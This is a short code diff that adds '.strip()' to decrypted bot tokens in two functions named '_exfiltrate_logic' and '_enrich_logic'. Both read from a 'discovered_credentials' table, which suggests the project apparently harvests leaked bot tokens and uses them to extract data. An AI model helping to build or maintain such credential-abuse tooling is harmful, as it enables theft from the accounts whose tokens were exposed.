@@ -68,7 +68,7 @@ async def _exfiltrate_logic(cred_id: str):
                 logger.info(f"    🩹 [Exfil] Self-healed unencrypted token for {cred_id}")
             except: pass
         else:
-            bot_token = security.decrypt(encrypted_token)
+            bot_token = security.decrypt(encrypted_token).strip()
     except Exception as e:
         # Invalid token or key mismatch
         logger.error(f"❌ [Exfil] Decryption failed for {cred_id}: {e}")
@@ -163,7 +163,7 @@ async def _enrich_logic(cred_id: str):
                 logger.info(f"    🩹 [Enrich] Self-healed unencrypted token for {cred_id}")
             except: pass
         else:
-            bot_token = security.decrypt(record["bot_token"])
+            bot_token = security.decrypt(record["bot_token"]).strip()
     except Exception as e:
         logger.error(f"❌ [Enrich] Decryption failed: {e}")
         await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
